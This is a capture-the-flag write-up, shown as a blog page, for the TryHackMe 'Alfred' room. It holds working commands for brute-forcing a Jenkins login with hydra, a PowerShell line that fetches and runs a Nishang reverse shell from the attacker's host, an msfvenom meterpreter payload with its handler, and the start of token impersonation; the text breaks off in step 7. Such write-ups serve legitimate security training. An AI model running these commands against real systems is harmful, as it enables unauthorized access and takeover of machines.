<!DOCTYPE html>
<html lang="en-us">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Alfred - Kebir Moundir Chemseddine</title><meta name="Description" content=""><meta property="og:title" content="Alfred" />
<meta property="og:description" content="Click here if you&rsquo;re interested in the room! This guide is meant to be used as a supplement for learning, please tackle this on your own before reading this!
 How many TCP ports are open? What is the username and password for the log in panel? Find a feature of the tool that allows you to execute commands on the underlying system. What is the user.txt flag? Switching shells Size of the payload Token Impersonation Output of guid command Migrating and finding root." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" />
<meta property="og:image" content="https://mondirkb.github.io/logo.png"/>
<meta property="article:published_time" content="2021-06-16T00:44:44-08:00" />
<meta property="article:modified_time" content="2021-06-16T00:44:44-08:00" /><meta property="og:site_name" content="KEBIR MOUNDIR CHEMSEDDINE" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://mondirkb.github.io/logo.png"/>

<meta name="twitter:title" content="Alfred"/>
<meta name="twitter:description" content="Click here if you&rsquo;re interested in the room! This guide is meant to be used as a supplement for learning, please tackle this on your own before reading this!
 How many TCP ports are open? What is the username and password for the log in panel? Find a feature of the tool that allows you to execute commands on the underlying system. What is the user.txt flag? Switching shells Size of the payload Token Impersonation Output of guid command Migrating and finding root."/>
<meta name="application-name" content="My cool site">
<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mondirkb.github.io/posts/alfred-machine/2020-10-11-alfred-machine/" /><link rel="prev" href="https://mondirkb.github.io/posts/doctor-machine/2020-12-01-doctor-machine-htb/" /><link rel="next" href="https://mondirkb.github.io/posts/theme-documentation-bilibili-shortcode/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Alfred",
        "inLanguage": "en-us",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/mondirkb.github.io\/posts\/alfred-machine\/2020-10-11-alfred-machine\/"
        },"genre": "posts","keywords": "TryHackMe","wordcount":  746 ,
        "url": "https:\/\/mondirkb.github.io\/posts\/alfred-machine\/2020-10-11-alfred-machine\/","datePublished": "2021-06-16T00:44:44-08:00","dateModified": "2021-06-16T00:44:44-08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "KEBIR MOUNDIR CHEMSEDDINE"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Kebir Moundir Chemseddine"><span class="header-title-pre">>$ echo</span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/wiretups/"> Wiretups </a><a class="menu-item" href="/#/Projects/"> Projects </a><a class="menu-item" href="/#/About/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Kebir Moundir Chemseddine"><span class="header-title-pre">>$ echo</span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/wiretups/" title="">Wiretups</a><a class="menu-item" href="/#/Projects/" title="">Projects</a><a class="menu-item" href="/#/About/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Alfred</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>KEBIR MOUNDIR CHEMSEDDINE</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-06-16">2021-06-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;746 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#click-here-if-youre-interested-in-the-roomhttpstryhackmecomroomalfred"><a href="https://tryhackme.com/room/alfred">Click here if you&rsquo;re interested in the room!</a></a></li>
    <li><a href="#1-the-first-question-asks-for-the-number-of-tcp-ports-open-we-can-use-a-nmap-scan-for-this">1) The first question asks for the number of TCP ports open, we can use a nmap scan for this.</a></li>
    <li><a href="#2-what-is-the-username-and-password-for-the-log-in-panelin-the-format-usernamepassword">2) What is the username and password for the log in panel(in the format username:password)</a></li>
    <li><a href="#3-find-a-feature-of-the-tool-that-allows-you-to-execute-commands-on-the-underlying-system">3) Find a feature of the tool that allows you to execute commands on the underlying system.</a></li>
    <li><a href="#4-what-is-the-usertxt-flag">4) What is the user.txt flag?</a></li>
    <li><a href="#5-switching-shells">5) Switching shells</a></li>
    <li><a href="#6-what-is-the-size-of-the-payload">6) What is the size of the payload</a></li>
    <li><a href="#7-token-impersonation">7) Token Impersonation</a></li>
    <li><a href="#8-output-of-guid">8) Output of guid</a></li>
    <li><a href="#9-migrating-and-finding-roottxt">9) Migrating and finding root.txt</a>
      <ul>
        <li><a href="#congratulations-the-room-is-now-complete-hopefully-this-guide-was-helpful-for-anyone-stuck-in-this-room">Congratulations, the room is now complete! Hopefully, this guide was helpful for anyone stuck in this room.</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="click-here-if-youre-interested-in-the-roomhttpstryhackmecomroomalfred"><a href="https://tryhackme.com/room/alfred" target="_blank" rel="noopener noreffer ">Click here if you&rsquo;re interested in the room!</a></h2>
<p><strong>This guide is meant to be used as a supplement for learning, please tackle this on your own before reading this!</strong></p>
<ol>
<li><a href="#1" rel="">How many TCP ports are open?</a></li>
<li><a href="#2" rel="">What is the username and password for the log in panel?</a></li>
<li><a href="#3" rel="">Find a feature of the tool that allows you to execute commands on the underlying system.</a></li>
<li><a href="#4" rel="">What is the user.txt flag?</a></li>
<li><a href="#5" rel="">Switching shells</a></li>
<li><a href="#6" rel="">Size of the payload</a></li>
<li><a href="#7" rel="">Token Impersonation</a></li>
<li><a href="#8" rel="">Output of guid command</a></li>
<li><a href="#9" rel="">Migrating and finding root.txt</a></li>
</ol>
<!-- raw HTML omitted -->
<h2 id="1-the-first-question-asks-for-the-number-of-tcp-ports-open-we-can-use-a-nmap-scan-for-this">1) The first question asks for the number of TCP ports open, we can use a nmap scan for this.</h2>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -vv -sC -sV -A -Pn -oN nmap.log <span class="o">{</span>target_ip_here<span class="o">}</span>
</code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830197-5854e580-cc79-11eb-9b1e-222a48c6e248.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830197-5854e580-cc79-11eb-9b1e-222a48c6e248.png, https://user-images.githubusercontent.com/60508293/121830197-5854e580-cc79-11eb-9b1e-222a48c6e248.png 1.5x, https://user-images.githubusercontent.com/60508293/121830197-5854e580-cc79-11eb-9b1e-222a48c6e248.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830197-5854e580-cc79-11eb-9b1e-222a48c6e248.png"
        title="image" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830228-699df200-cc79-11eb-8f13-f8aff52090b5.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830228-699df200-cc79-11eb-8f13-f8aff52090b5.png, https://user-images.githubusercontent.com/60508293/121830228-699df200-cc79-11eb-8f13-f8aff52090b5.png 1.5x, https://user-images.githubusercontent.com/60508293/121830228-699df200-cc79-11eb-8f13-f8aff52090b5.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830228-699df200-cc79-11eb-8f13-f8aff52090b5.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="2-what-is-the-username-and-password-for-the-log-in-panelin-the-format-usernamepassword">2) What is the username and password for the log in panel(in the format username:password)</h2>
<p>Seems like port 8080 is open so lets navigate to that.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830311-9d791780-cc79-11eb-95b5-bf9587c0fe16.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830311-9d791780-cc79-11eb-95b5-bf9587c0fe16.png, https://user-images.githubusercontent.com/60508293/121830311-9d791780-cc79-11eb-95b5-bf9587c0fe16.png 1.5x, https://user-images.githubusercontent.com/60508293/121830311-9d791780-cc79-11eb-95b5-bf9587c0fe16.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830311-9d791780-cc79-11eb-95b5-bf9587c0fe16.png"
        title="image" /></p>
<p>Navigating to the target ip at port 8080 brings us to a login page for [Jenkins]
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830930-12991c80-cc7b-11eb-9c32-2b018d9f9b92.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830930-12991c80-cc7b-11eb-9c32-2b018d9f9b92.png, https://user-images.githubusercontent.com/60508293/121830930-12991c80-cc7b-11eb-9c32-2b018d9f9b92.png 1.5x, https://user-images.githubusercontent.com/60508293/121830930-12991c80-cc7b-11eb-9c32-2b018d9f9b92.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830930-12991c80-cc7b-11eb-9c32-2b018d9f9b92.png"
        title="image" /></p>
<p>Viewing the page source doesn&rsquo;t seem to give any hidden credentials, so we will need to be bruteforcing credentials.</p>
<p>I will be using hydra for this.</p>
<p>First, I&rsquo;ll be using BurpSuite to intercept the login request.
We can see that it is a http post request along with the required parameters circled in red.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830863-e8dff580-cc7a-11eb-8320-d5beb1ded444.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830863-e8dff580-cc7a-11eb-8320-d5beb1ded444.png, https://user-images.githubusercontent.com/60508293/121830863-e8dff580-cc7a-11eb-8320-d5beb1ded444.png 1.5x, https://user-images.githubusercontent.com/60508293/121830863-e8dff580-cc7a-11eb-8320-d5beb1ded444.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830863-e8dff580-cc7a-11eb-8320-d5beb1ded444.png"
        title="image" /></p>
<p>It seems like both the username and pass are 5 words long, I&rsquo;ll be using hydra to bruteforce credentials.
I will be making a copy of a username text file and a password textfile that are only five characters long from seclists.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830634-44f64a00-cc7a-11eb-807e-1c346439cbe3.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830634-44f64a00-cc7a-11eb-807e-1c346439cbe3.png, https://user-images.githubusercontent.com/60508293/121830634-44f64a00-cc7a-11eb-807e-1c346439cbe3.png 1.5x, https://user-images.githubusercontent.com/60508293/121830634-44f64a00-cc7a-11eb-807e-1c346439cbe3.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830634-44f64a00-cc7a-11eb-807e-1c346439cbe3.png"
        title="image" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121830726-84249b00-cc7a-11eb-8bc7-21d880aae6a0.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121830726-84249b00-cc7a-11eb-8bc7-21d880aae6a0.png, https://user-images.githubusercontent.com/60508293/121830726-84249b00-cc7a-11eb-8bc7-21d880aae6a0.png 1.5x, https://user-images.githubusercontent.com/60508293/121830726-84249b00-cc7a-11eb-8bc7-21d880aae6a0.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121830726-84249b00-cc7a-11eb-8bc7-21d880aae6a0.png"
        title="image" /></p>
<p>using hydra to bruteforce credentials</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">hydra -L five_c_user.txt -P five_c_pass.txt -s <span class="m">8080</span> <span class="o">{</span>target_ip<span class="o">}</span> http-post-form <span class="s2">&#34;j/acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password
</span></code></pre></div><p><strong>Success we can now login with our new credentials!</strong></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121831597-afa88500-cc7c-11eb-97ad-7ba6f746e81a.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121831597-afa88500-cc7c-11eb-97ad-7ba6f746e81a.png, https://user-images.githubusercontent.com/60508293/121831597-afa88500-cc7c-11eb-97ad-7ba6f746e81a.png 1.5x, https://user-images.githubusercontent.com/60508293/121831597-afa88500-cc7c-11eb-97ad-7ba6f746e81a.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121831597-afa88500-cc7c-11eb-97ad-7ba6f746e81a.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="3-find-a-feature-of-the-tool-that-allows-you-to-execute-commands-on-the-underlying-system">3) Find a feature of the tool that allows you to execute commands on the underlying system.</h2>
<p>Peering around the website we go into the project -&gt; configure -&gt; build and we are presented with something that looks like a CLI.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121832123-2db95b80-cc7e-11eb-80dd-0ff3d7077b35.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121832123-2db95b80-cc7e-11eb-80dd-0ff3d7077b35.png, https://user-images.githubusercontent.com/60508293/121832123-2db95b80-cc7e-11eb-80dd-0ff3d7077b35.png 1.5x, https://user-images.githubusercontent.com/60508293/121832123-2db95b80-cc7e-11eb-80dd-0ff3d7077b35.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121832123-2db95b80-cc7e-11eb-80dd-0ff3d7077b35.png"
        title="image" /></p>
<p>If we save and build the project again, we can see the whoami command is invoked in the latest build.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121832253-82f56d00-cc7e-11eb-89cd-3fc551689195.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121832253-82f56d00-cc7e-11eb-89cd-3fc551689195.png, https://user-images.githubusercontent.com/60508293/121832253-82f56d00-cc7e-11eb-89cd-3fc551689195.png 1.5x, https://user-images.githubusercontent.com/60508293/121832253-82f56d00-cc7e-11eb-89cd-3fc551689195.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121832253-82f56d00-cc7e-11eb-89cd-3fc551689195.png"
        title="image" /></p>
<p>Seems like we can gain access to the machine using a reverse shell.</p>
<p>Let&rsquo;s grab Nishang&rsquo;s TCP reverse shell script</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
</code></pre></div><p>Next, we&rsquo;ll need to host a http.server so the server can download the powershell file. (default port 8000)</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 -m http.server
</code></pre></div><p>We will also need to open a netcat listener for the reverse shell, I will be using a wrapper called rlwrap along with nc to do this.</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">rlwrap nc -lvnp 4444
</code></pre></div><p>Run the  powerline command in the room.
The first download port should be the http.server port (8000) and the other port should be the nc reverse shell listener port (4444 in my case)
Then click build now.</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">your-ip</span> <span class="n">-Port</span> <span class="n">your-port</span>
</code></pre></div><!-- raw HTML omitted -->
<h2 id="4-what-is-the-usertxt-flag">4) What is the user.txt flag?</h2>
<p>We should be connected to our reverse shell after invoking the build.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121841549-67489180-cc93-11eb-9f1a-9a1ebadea749.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121841549-67489180-cc93-11eb-9f1a-9a1ebadea749.png, https://user-images.githubusercontent.com/60508293/121841549-67489180-cc93-11eb-9f1a-9a1ebadea749.png 1.5x, https://user-images.githubusercontent.com/60508293/121841549-67489180-cc93-11eb-9f1a-9a1ebadea749.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121841549-67489180-cc93-11eb-9f1a-9a1ebadea749.png"
        title="image" /></p>
<p>We&rsquo;re looking for a user.txt file, so lets run the equivalent find command in powershell</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-Childitem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span><span class="p">*</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</code></pre></div><p>Seems like we got a match!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121840047-3155de00-cc90-11eb-89e5-f4fd6db2ed46.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121840047-3155de00-cc90-11eb-89e5-f4fd6db2ed46.png, https://user-images.githubusercontent.com/60508293/121840047-3155de00-cc90-11eb-89e5-f4fd6db2ed46.png 1.5x, https://user-images.githubusercontent.com/60508293/121840047-3155de00-cc90-11eb-89e5-f4fd6db2ed46.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121840047-3155de00-cc90-11eb-89e5-f4fd6db2ed46.png"
        title="image" /></p>
<p>Success!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121840081-52b6ca00-cc90-11eb-82ec-74b932f74956.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121840081-52b6ca00-cc90-11eb-82ec-74b932f74956.png, https://user-images.githubusercontent.com/60508293/121840081-52b6ca00-cc90-11eb-82ec-74b932f74956.png 1.5x, https://user-images.githubusercontent.com/60508293/121840081-52b6ca00-cc90-11eb-82ec-74b932f74956.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121840081-52b6ca00-cc90-11eb-82ec-74b932f74956.png"
        title="image" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121840109-65c99a00-cc90-11eb-8656-d632f9843b92.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121840109-65c99a00-cc90-11eb-8656-d632f9843b92.png, https://user-images.githubusercontent.com/60508293/121840109-65c99a00-cc90-11eb-8656-d632f9843b92.png 1.5x, https://user-images.githubusercontent.com/60508293/121840109-65c99a00-cc90-11eb-8656-d632f9843b92.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121840109-65c99a00-cc90-11eb-8656-d632f9843b92.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="5-switching-shells">5) Switching shells</h2>
<p>Using nc for a reverse shell is usually unstable or very buggy so using Metasploit to gain a meterpreter shell will give us a more full-fleshed shell experience.</p>
<p>Use msfvenom to generate a payload for the windows reverse shell (Im naming it as hello.exe):</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=[</span>IP<span class="o">]</span> <span class="nv">LPORT</span><span class="o">=[</span>PORT<span class="o">]</span> -f exe -o hello.exe
</code></pre></div><p>Host a python server on your local machine:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span>
</code></pre></div><p>Use the following command on our netcat reverse shell:</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="s2">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://&lt;ip&gt;:8000/hello.exe&#39;,&#39;hello.exe&#39;)&#34;</span>
</code></pre></div><p>Seems like the powershell command successfully downloaded our payload.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121995046-2ddb5900-cd5b-11eb-9e9b-4a2613e061b4.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121995046-2ddb5900-cd5b-11eb-9e9b-4a2613e061b4.png, https://user-images.githubusercontent.com/60508293/121995046-2ddb5900-cd5b-11eb-9e9b-4a2613e061b4.png 1.5x, https://user-images.githubusercontent.com/60508293/121995046-2ddb5900-cd5b-11eb-9e9b-4a2613e061b4.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121995046-2ddb5900-cd5b-11eb-9e9b-4a2613e061b4.png"
        title="image" /></p>
<p>Now we have to setup our handler in Metasploit</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121995391-b3f79f80-cd5b-11eb-98c1-f2172090b0a5.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121995391-b3f79f80-cd5b-11eb-98c1-f2172090b0a5.png, https://user-images.githubusercontent.com/60508293/121995391-b3f79f80-cd5b-11eb-98c1-f2172090b0a5.png 1.5x, https://user-images.githubusercontent.com/60508293/121995391-b3f79f80-cd5b-11eb-98c1-f2172090b0a5.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121995391-b3f79f80-cd5b-11eb-98c1-f2172090b0a5.png"
        title="image" /></p>
<p>Finally we are ready to execute the program.
Enter this command in the powershell:</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Start-Process</span> <span class="s2">&#34;hello.exe&#34;</span>
</code></pre></div><p>Sucessfully connected.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121996252-1b621f00-cd5d-11eb-81af-63f129f5a167.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121996252-1b621f00-cd5d-11eb-81af-63f129f5a167.png, https://user-images.githubusercontent.com/60508293/121996252-1b621f00-cd5d-11eb-81af-63f129f5a167.png 1.5x, https://user-images.githubusercontent.com/60508293/121996252-1b621f00-cd5d-11eb-81af-63f129f5a167.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121996252-1b621f00-cd5d-11eb-81af-63f129f5a167.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="6-what-is-the-size-of-the-payload">6) What is the size of the payload</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121997974-063abf80-cd60-11eb-952e-4e2c916f4946.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121997974-063abf80-cd60-11eb-952e-4e2c916f4946.png, https://user-images.githubusercontent.com/60508293/121997974-063abf80-cd60-11eb-952e-4e2c916f4946.png 1.5x, https://user-images.githubusercontent.com/60508293/121997974-063abf80-cd60-11eb-952e-4e2c916f4946.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121997974-063abf80-cd60-11eb-952e-4e2c916f4946.png"
        title="image" /></p>
<!-- raw HTML omitted -->
<h2 id="7-token-impersonation">7) Token Impersonation</h2>
<p>Now that we&rsquo;re in the meterpreter shell, lets switch to powershell before executing the following commands.</p>
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">use</span> <span class="n">powershell</span>
<span class="n">powershell_shell</span>
<span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</code></pre></div><p>We can use the incognito module to exploit these two privileges.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121997268-f4a4e800-cd5e-11eb-83c8-596a9a0afc72.png"
        data-srcset="https://user-images.githubusercontent.com/60508293/121997268-f4a4e800-cd5e-11eb-83c8-596a9a0afc72.png, https://user-images.githubusercontent.com/60508293/121997268-f4a4e800-cd5e-11eb-83c8-596a9a0afc72.png 1.5x, https://user-images.githubusercontent.com/60508293/121997268-f4a4e800-cd5e-11eb-83c8-596a9a0afc72.png 2x"
        data-sizes="auto"
        alt="https://user-images.githubusercontent.com/60508293/121997268-f4a4e800-cd5e-11eb-83c8-596a9a0afc72.png"
        title="image" /></p>
<p>Exit out of powershell and execute in the meterpreter shell:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://user-images.githubusercontent.com/60508293/121997459-3e8dce00-cd5f-11eb-913e-8a3715c60f13.png"
